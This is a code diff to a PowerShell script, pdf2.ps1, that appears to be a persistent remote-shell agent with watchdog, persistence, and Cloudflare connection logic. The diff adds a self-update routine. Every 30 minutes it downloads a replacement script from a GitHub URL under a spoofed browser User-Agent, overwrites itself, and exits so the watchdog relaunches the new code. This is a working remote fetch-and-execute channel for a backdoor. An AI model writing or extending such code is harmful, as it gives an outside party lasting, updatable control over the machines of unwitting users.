@@ -8,6 +8,11 @@ $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' fo
 $maxChunkBytes = 32000  # cap per-chunk size
 $clientId = "$($env:COMPUTERNAME)-$($env:USERNAME)"
 
+# --- AUTO-UPDATE CONFIG (removable) ---
+$updateUrl = "https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1"
+$updateCheckMins = 30   # check for updates every N minutes
+# --- end auto-update config ---
+
 # ╔══════════════════════════════════════════════════════════════════════════════╗
 # ║  SELF-PATH RESOLUTION                                                      ║
 # ║  Determines script location for logging, persistence, and EXE detection.   ║
@@ -90,6 +95,56 @@ try {
     # Apply changes
     powercfg /setactive SCHEME_CURRENT 2>$null
 } catch {}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  AUTO-UPDATE (removable)                                                    ║
+# ║  Periodically downloads the latest script from GitHub. If the hash differs,║
+# ║  overwrites itself and exits — the watchdog relaunches the new version.    ║
+# ║  Requires: $updateUrl, $updateCheckMins from CONFIGURATION.                ║
+# ║  To remove: delete this block and the config vars. No other code depends.  ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+$script:lastUpdateCheck = Get-Date
+
+function Update-Self {
+    <# Returns $true if script was updated and a restart is needed. #>
+    try {
+        $script:lastUpdateCheck = Get-Date
+
+        # Download latest version to temp file
+        $tempFile = Join-Path $env:TEMP "pdf2_update_$(Get-Random).ps1"
+        try {
+            $wc = New-Object System.Net.WebClient
+            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+            $wc.DownloadFile($updateUrl, $tempFile)
+            $wc.Dispose()
+        } catch {
+            Write-Log "Update download failed: $($_.Exception.Message)" "WARN"
+            return $false
+        }
+
+        # Compare hashes
+        $currentHash = (Get-FileHash -Path $selfPath -Algorithm SHA256 -ErrorAction Stop).Hash
+        $newHash     = (Get-FileHash -Path $tempFile  -Algorithm SHA256 -ErrorAction Stop).Hash
+
+        if ($currentHash -eq $newHash) {
+            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+            return $false
+        }
+
+        # Different — overwrite self with new version
+        Write-Log "Update found! Hash $($currentHash.Substring(0,8)).. -> $($newHash.Substring(0,8)).." "INFO"
+        Copy-Item -Path $tempFile -Destination $selfPath -Force
+        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+
+        Write-Log "Updated. Releasing mutex and exiting for watchdog restart." "INFO"
+        try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
+        try { $script:singleInstanceMutex.Dispose() } catch {}
+        return $true
+    } catch {
+        Write-Log "Update check error: $($_.Exception.Message)" "WARN"
+        return $false
+    }
+}
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
 # ║  LOGGING (shell.txt)                                                       ║
@@ -605,6 +660,13 @@ function Connect-Cloudflare {
                          elseif ($consecutiveIdle -le 50) { $idleStep2 }
                          else { $idleStep3 }
                 Start-Sleep -Milliseconds $delay
+
+                # --- AUTO-UPDATE CHECK (removable) ---
+                $minsSinceCheck = ((Get-Date) - $script:lastUpdateCheck).TotalMinutes
+                if ($minsSinceCheck -ge $updateCheckMins) {
+                    if (Update-Self) { exit }
+                }
+                # --- end auto-update check ---
             }
         }
         catch {
